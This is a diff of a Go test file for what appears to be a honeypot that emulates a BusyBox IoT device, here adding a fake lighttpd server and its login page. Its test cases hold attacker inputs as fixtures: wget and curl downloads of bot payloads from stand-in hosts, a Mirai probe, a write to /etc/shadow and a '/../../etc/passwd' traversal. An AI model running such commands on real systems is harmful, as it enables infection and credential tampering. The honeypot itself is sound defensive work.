@@ -27,7 +27,7 @@ func TestRun(t *testing.T) {
 		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
 		{"busybox echo hello", "hello\n"},
 		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
-		{"ls /var", "log  run  tmp\n"},
+		{"ls /var", "log  run  tmp  www\n"},
 		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
 		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
 		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
@@ -37,8 +37,13 @@ func TestRun(t *testing.T) {
 		{"cat /tmp", "cat: read error: Is a directory\n"},
 		{"./bot", "-sh: ./bot: not found\n"},
 		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
-		{"ls /etc", "dropbear     hostname     issue.net    passwd       resolv.conf  shells\n" + // columns as wide as
-			"group        hosts        os-release   profile      shadow\n"}, // the longest name + 2, top to bottom
+		{"ls /etc", "dropbear     hostname     issue.net    os-release   profile      shadow\n" + // columns as wide
+			"group        hosts        lighttpd     passwd       resolv.conf  shells\n"}, // as the longest name + 2
+		{"ps | grep lighttpd", "  349 root      2108 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf\n"}, // port 80 = a running web server
+		{"cat /var/run/lighttpd.pid", "349\n"}, // its PID, in the pid-file from its config
+		{"ls /var/www", "index.html  login.cgi\n"},
+		{"grep document-root /etc/lighttpd/lighttpd.conf", "server.document-root = \"/var/www\"\n"},
+		{"cat /var/www/index.html | grep action", "    <form method=\"POST\" action=\"/login.cgi\">\n"},
 		{"curl -O http://x/a.sh", "-sh: curl: not found\n"}, // BusyBox has no curl
 		{"enable", "-sh: enable: not found\n"},              // Mirai's probe for a vendor CLI
 		{"cat /etc/shells", "/bin/ash\n"},
@@ -48,7 +53,7 @@ func TestRun(t *testing.T) {
 		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
 		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
 		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
-		{"cd /bin; ./ls /var", "log  run  tmp\n"},
+		{"cd /bin; ./ls /var", "log  run  tmp  www\n"},
 		{"/sbin/init", "init: must be run as PID 1\n"},
 		{"cat /var/run/dropbear.pid", "341\n"},
 		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
@@ -77,6 +82,8 @@ func TestExitCodes(t *testing.T) {
 		{"wget http://203.0.113.7/x", 1},
 		{"false && echo never", 1}, // echo is skipped, so $? stays 1
 		{"nosuchcmd || true", 0},
+		{"lighttpd", 0}, // a program in PATH that isn't an applet: "runs" silently
+		{"/usr/sbin/dropbear", 0},
 		{"cat /etc/hostname | grep nomatch", 1}, // a pipe's code is its last command's
 		{"", 0},
 	}
@@ -136,11 +143,11 @@ func TestLs(t *testing.T) {
 	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
 	tests := []struct{ line, want string }{
 		{"ls /", "bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
-		{"ls -1 /var", "log\nrun\ntmp\n"},
-		{"ls --color=auto /var", "log  run  tmp\n"},
+		{"ls -1 /var", "log\nrun\ntmp\nwww\n"},
+		{"ls --color=auto /var", "log  run  tmp  www\n"},
 		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
-		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid\n"},
-		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid\n"},
+		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
+		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid  lighttpd.pid\n"},
 
 		// hidden files (.x) only with -a or -A, or when named
 		{nippon + "ls", "d\n"},
@@ -152,7 +159,8 @@ func TestLs(t *testing.T) {
 		// the attacker's files from "now"
 		{"ls -la", "drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
 			"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n"},
-		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n"},
+		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n" +
+			"-rw-r--r--    1 root     root             4 Nov 18 09:15 lighttpd.pid\n"},
 		{"ls -l /bin/sh /bin/busybox /dev/null",
 			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
 				"lrwxrwxrwx    1 root     root             7 Jun  4  2020 /bin/sh -> busybox\n" +
@@ -168,6 +176,8 @@ func TestLs(t *testing.T) {
 				"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n" +
 				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
 				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
+		{"ls -l /var/www/login.cgi", // a program; /var/www is on the firmware, not in RAM like /var/run
+			"-rwxr-xr-x    1 root     root         13764 Jun  4  2020 /var/www/login.cgi\n"},
 		{"ls -l /etc/dropbear", // a key file in Dropbear's format, 141 bytes like a real ECDSA P-256 one
 			"-rw-------    1 root     root           141 Jun  4  2020 dropbear_ecdsa_host_key\n"},
 		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
@@ -237,6 +247,30 @@ func TestBusyboxHelp(t *testing.T) {
 		"\tsyslogd, telnetd, tftp, touch, true, uname, wget, whoami\n"
 	if !strings.HasSuffix(out, want) {
 		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
+	}
+}
+
+// The web server's files come from /var/www; ".." can't leave it (lighttpd cleans the path too).
+func TestWebFile(t *testing.T) {
+	tests := []struct {
+		path   string
+		exists bool
+	}{
+		{"/", true}, // index-file.names: index.html
+		{"/index.html", true},
+		{"/login.cgi", true},
+		{"/login", false},
+		{"/../../etc/passwd", false}, // = /var/www/etc/passwd, not /etc/passwd
+		{"/etc/passwd", false},
+		{"/var/www/index.html", false}, // a URL path, not a filesystem path
+	}
+	for _, tt := range tests {
+		if _, ok := WebFile(tt.path); ok != tt.exists {
+			t.Errorf("WebFile(%q): exists = %v, want %v", tt.path, ok, tt.exists)
+		}
+	}
+	if page, _ := WebFile("/"); page != LoginPage(false) {
+		t.Error("/ is not the login page")
 	}
 }
 
